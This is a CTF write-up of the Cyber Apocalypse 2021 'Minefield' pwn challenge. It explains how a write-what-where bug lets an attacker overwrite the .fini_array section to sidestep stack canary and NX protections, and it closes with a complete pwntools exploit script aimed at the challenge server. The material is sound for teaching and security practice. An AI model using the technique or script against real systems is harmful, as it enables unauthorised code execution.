---
title: "Cyber Apocalypse CTF 2021 - Minefield (Pwn)"
date: 2021-05-19 09:00:00 +0100
categories: [CTF writeup, Pwn]
tags: [CTF, pwn, 64-bit ELF, buffer overflow, bypass canary, fini_array, checksec, gdb-peda, ghidra, pwntools]
image: /assets/img/ctf/cyber-apocalypse-2021/CyberApocalypseCTF2021.jpg
pin: true
---

> A few weeks ago I participated to [Cyber Apocalypse CTF 2021](https://www.hackthebox.eu/cyber-apocalypse-ctf-2021) which was organized by [hackthebox.eu](https://www.hackthebox.eu/), [cryptohack.org](https://cryptohack.org/) and [code.org](https://code.org/). I mainly focused on Pwn, Reverse and Forensic challenges. Here is the writeup for the [Minefield challenge](https://ctftime.org/task/15714). I will also post the writeup for the [Controller challenge](https://ctftime.org/task/15698) soon

Let's start by using the `file` command on the given binary:

```bash
$ file minefield
minefield: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=917a7e342565e55408ed3c698c7cd0707a9ddd9a, not stripped
```

`minefield` is a **64-bit ELF**.
It is dynamically linked, which means that the **LIBC** is not directly incorporated into the binary.
Finally, it is `not stripped` so it contains symbols, which will allow us to debug and decompile it more easily.

By using `checksec`, we can see that the **CANARY** is active, and that the stack is not executable (**NX**):

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/checksec.PNG)

> `checksec` can be executed both from `gdb` and from outside `gdb`.

Generally, in a CTF context, when CANARY is active, we can expect 2 scenarios:

1. **bruteforcing** it _(as in this [example](https://www.dailysecurity.fr/la-stack-smashing-protection/))_
2. retrieving it by **leaking the contents of the stack** via a format string vulnerability _(as in this [example](https://www.programmersought.com/article / 4093510679/))_.

**Spoil alert**: in this case, it will be neither of the two scenarios :D

## 1. Identify the `win()` function

Still in `gdb`, if we list the binary functions via the `info fu` command _(shortcut to the `info functions` command)_, we can see that there is a function with a strange name ("`_`") :

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/info_fu.PNG)

We can decompile the binary using `ghidra` and look at the source code of this function:

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/winfunction.png)

The "`_`" function makes a call to `system("cat flag *")`.

Well done! We identified our `win()` function.

> **Note**: in pwn challenges, we call "`win()` function" a function that allows you to open a shell or display the flag.

The objective of this challenge is to find a way to redirect the execution flow and to call this `win()` function, despite the implemented protections CANARY and NX.

## 2. Reverse engineering & Arbitrary write

The `main()` function calls the `menu()` function:

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/main.png)

The `menu()` function asks the user if he is ready to plant mines via the `scanf` function and stores the result in an _int_ variable:

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/menu.png)

If the user does not enter either "1" or "2" then the `invalid()` function is called and displays "Mission failed!":

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/invalid.png)

If the user does not enter "1", then the user is considered not to be ready.
The `choice()` function is called and displays the following message:

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/choice.png)

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/no.png)

Finally, if the user enters "2" then the user is considered ready and the `mission()` function is called.

The `mission()` function waits for two values:
1. "Insert type of mine:" &rarr; in a 10 characters buffer (`local_24`)
2. "Insert location to plant:" &rarr; also in a 10 characters buffer (`local_1a`)

Each user input is converted to _unsigned long long int_ via the **LIBC**'s function of [strtoull](https://linux.die.net/man/3/strtoull).

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/source.png)

User input is handled by the `r()` function which is just a "wrapper" around the `read()` function of the **LIBC** (with the CANARY support). 

It will read 9 characters from the standard input (`stdin`):

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/r.png)

When we run the binary, we get a _segmentation fault_ systematically:

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/segfault.png)

This is because of this line in the `mission()` function:

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/overwrite.png)

This is a typical **write-what-where** instruction, i.e that we can write what we want, where we want.
The address pointed by `puVar1` is replaced by the address `uVar2`.

- `puVar1` corresponds to our input for "Insert type of mine:" converted to _unsigned long long int_
- `uVar1` corresponds to our input for "Insert location to plant:" converted to _unsigned long long int_

Our strategy will be as follows: 
- using this **write-what-where** to replace the address of a function executed after the `mission()` function, with the address of the function "`_`"
.

To do this, we can corrupt the memory by modifying the Procedure Linkage Table (**PLT**) or the **.fini_array** section:

> **.fini_array** is an array of functions called when the program terminates.

> The **PLT** is an array of function pointers. Every function called by the program that resides in an external library (such as the LIBC) resides in the PLT. The reason it is writable during the runtime is because of the support for **lazy liking** (which consists in resolving the address of a function is only when it is called for the first time)

So if we modify **.fini_array** by inserting the address of the function "`_`", we will win.

> It is possible to corrupt these sections because **RELRO** (Relocation Read-Only) protection has not been activated. This protection makes the “data” sections (GOT, PLT…) accessible only in read-only mode.

## 3. Writing the exploit

When you start to write an exploit, it is good to have a template/skeleton that you can start from. The one I am using is the following:

```python
import pwn

host = "127.0.0.1"
port = 1337

remote = False

binary_path = './vuln'
binary = pwn.ELF(binary_path)

if remote:
    r = pwn.remote(host,port)
else:
    r = pwn.process(binary_path)

# Exploit code starts here :)

r.interactive()
r.close()
```

- Then, we start by retrieving the address of the `win()` function:

```python
win_fn = binary.symbols['_']
```

> It is also possible to add the address manually by retrieving it via the command `nm minefield | grep "_"`. But doing it this way is less elegant than using `pwntools` directly ^^

- We get the address of the section **.fini_array**:

```python
fini_array_addr = binary.get_section_by_name('.fini_array').header.sh_addr
```

> We can also add the address manually by retrieving it via the command `info files` inside `gdb`. But doing it this way is less elegant than using `pwntools` directly ^^

- We can print these two addresses in hexadecimal::

```python
pwn.info("Win function '_' address: 0x%x" % win_fn)
pwn.info(".fini_array section address: 0x%x" % fini_array_addr)
```

- The binary waits for 3 inputs:

1. "Are you ready to plant the mine?" &rarr; "2" and then call the `mission()` function
2. "Insert type of mine:" &rarr; address where we will write to
3. "Insert location to plant:" &rarr; address we want to write

> Before interacting directly with the server on which the binary is being executed, it is better to test the exploit locally by creating a "flag.txt" file and check if we called the "`_`" function successfully.

- With the following exploit it is possible to recover the flag:

```python
import pwn

host = "138.68.147.232"
port = 30174

remote = True

binary_path = './minefield'
binary = pwn.ELF(binary_path)

if remote:
    r = pwn.remote(host,port)
else:
    r = pwn.process(binary_path)

win_fn = binary.symbols['_'] # nm minefield | grep "_"
fini_array_addr = binary.get_section_by_name('.fini_array').header.sh_addr # (gdb) info files

pwn.info("Win function '_' address: 0x%x" % win_fn)
pwn.info(".fini_array section address: 0x%x" % fini_array_addr)

r.sendlineafter(">", b"2")                                     
r.sendlineafter("Insert type of mine: ", str(fini_array_addr))
r.sendlineafter("Insert location to plant: ", str(win_fn))

r.interactive()
r.close()
```

![](/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/flag.png)

___

## Useful links

- [Pwntools documentation - ELF](https://docs.pwntools.com/en/latest/elf/elf.html#pwnlib.elf.elf.ELF.address)
